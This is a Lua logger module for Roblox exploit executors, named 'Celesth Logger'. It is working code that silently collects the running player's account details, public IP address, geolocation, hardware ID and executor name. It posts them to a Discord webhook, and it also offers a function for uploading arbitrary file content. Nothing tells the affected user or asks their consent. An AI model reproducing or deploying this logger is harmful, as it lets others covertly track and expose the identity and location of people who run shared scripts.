local Celesth = {}
Celesth.__index = Celesth

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local AnalyticsService = game:GetService("RbxAnalyticsService")

local LP = Players.LocalPlayer
local UserId = LP.UserId
local DisplayName = LP.DisplayName
local Username = LP.Name
local Membership = tostring(LP.MembershipType):sub(21)
local AccountAge = LP.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local JoinLine = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Config flags (_G)
_G.IpLog = _G.IpLog ~= false
_G.GeoLog = _G.GeoLog ~= false
_G.HwidLog = _G.HwidLog ~= false
_G.ExecutorLog = _G.ExecutorLog ~= false
_G.JobIdLog = _G.JobIdLog ~= false
_G.PingEveryone = _G.PingEveryone or false
_G.IgnoreLoggedCheck = _G.IgnoreLoggedCheck or false
_G.IgnoreCooldown = _G.IgnoreCooldown or false
_G.WebhookCooldown = tonumber(_G.WebhookCooldown) or 60
_G.EmbedTitle = _G.EmbedTitle or "Script Executed"
_G.EmbedMessage = _G.EmbedMessage or ""
_G.EmbedColor = tonumber(_G.EmbedColor) or 16766720
_G.EmbedThumbnail = _G.EmbedThumbnail or ("https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=150&height=150&format=png")

-- Constants
local AVATAR_URL = ""
local FOOTER_TEXT = "Celesth Logger • korieuko"
local LOG_PATH = "stellarium/logged.txt"

-- G_
_G_ = rawget(getgenv(), "G_") or {}; getgenv().G_ = _G_

-- Info functions
local function GetIP()
    if not _G.IpLog then return "Disabled" end
    if not G_.ip then
        local ok, res = pcall(function() return game:HttpGet("https://v4.ident.me/") end)
        G_.ip = ok and res or "Unavailable"
    end
    return G_.ip
end

local function GetGeo()
    if not _G.GeoLog then return {message = "Disabled"} end
    if not G_.geo then
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json") end)
        G_.geo = ok and HttpService:JSONDecode(res) or { message = "Unavailable" }
    end
    return G_.geo
end

local function GetHWID()
    return _G.HwidLog and AnalyticsService:GetClientId() or "Disabled"
end

local function GetExecutor()
    if not _G.ExecutorLog then return "Disabled" end
    return (identifyexecutor and identifyexecutor()) or "Unknown"
end

function Celesth:BuildEmbed()
    local ip, geo, hwid, exec = GetIP(), GetGeo(), GetHWID(), GetExecutor()

    local desc = table.concat({
        "**Profile Link:** [View Profile](https://www.roblox.com/users/" .. UserId .. ")",
        "**Game Link:** [View Game](https://www.roblox.com/games/" .. game.PlaceId .. ")",
        "",
        "Username:\n" .. Username,
        "DisplayName:\n" .. DisplayName,
        "UserId:\n" .. tostring(UserId),
        "Membership:\n" .. Membership,
        "AccountAge:\n" .. tostring(AccountAge),
        "Country:\n" .. Country,
    }, "\n\n")

    if _G.IpLog then desc = desc .. "\n\nIP:\n" .. ip end
    if _G.HwidLog then desc = desc .. "\n\nHWID:\n" .. hwid end
    if _G.ExecutorLog then desc = desc .. "\n\nExecutor:\n" .. exec end

    desc = desc .. "\n\nDate:\n" .. os.date("%m/%d/%Y") .. " " .. os.date("%X")
    desc = desc .. "\n\nGame:\n" .. GameName
    desc = desc .. "\n\nGameId:\n" .. tostring(game.PlaceId)

    if _G.GeoLog then
        desc = desc .. "\n\nGeoData:\n" .. HttpService:JSONEncode(geo)
    end
    if _G.JobIdLog then
        desc = desc .. "\n\nJobId:\n" .. JoinLine
    end

    return {
        avatar_url = AVATAR_URL,
        content = (_G.PingEveryone and "@everyone\n" or "") .. _G.EmbedMessage,
        embeds = {{
            author = { name = _G.EmbedTitle, url = "https://roblox.com" },
            description = desc,
            type = "rich",
            color = _G.EmbedColor,
            thumbnail = { url = _G.EmbedThumbnail },
            footer = { text = FOOTER_TEXT },
        }}
    }
end

function Celesth:Log(webhookUrl)
    assert(type(webhookUrl) == "string", "Webhook URL needed")

    if not _G.IgnoreCooldown and G_.LastSent then
        local delta = tick() - G_.LastSent
        if delta < _G.WebhookCooldown then return end
    end

    if not _G.IgnoreLoggedCheck and isfile and readfile then
        if isfile(LOG_PATH) and readfile(LOG_PATH):lower():find("true") then return end
    end

    local req = http_request or request
    assert(req, "HTTP request unavailable")
    req({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(self:BuildEmbed())
    })

    G_.LastSent = tick()
    if writefile then
        pcall(function()
            if not isfolder("stellarium") then makefolder("stellarium") end
            writefile(LOG_PATH, "true")
        end)
    end
end

function Celesth:SendFile(webhookUrl, filename, content, msg)
    assert(type(filename) == "string" and type(content) == "string", "Invalid file")
    local boundary = "celesth-boundary-" .. tostring(math.random(100000, 999999))
    local body = table.concat({
        "--" .. boundary,
        [[Content-Disposition: form-data; name="payload_json"]],
        "",
        HttpService:JSONEncode({
            content = (_G.PingEveryone and "@everyone " or "") .. (msg or ""),
            username = "Celesth Logger",
            avatar_url = AVATAR_URL
        }),
        "--" .. boundary,
        'Content-Disposition: form-data; name="file"; filename="' .. filename .. '"',
        "Content-Type: text/plain",
        "",
        content,
        "--" .. boundary .. "--",
    }, "\r\n")

    local req = http_request or request
    assert(req, "HTTP request unavailable")
    req({
        Url = webhookUrl,
        Method = "POST",
        Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
        Body = body
    })
end

return setmetatable({}, Celesth)
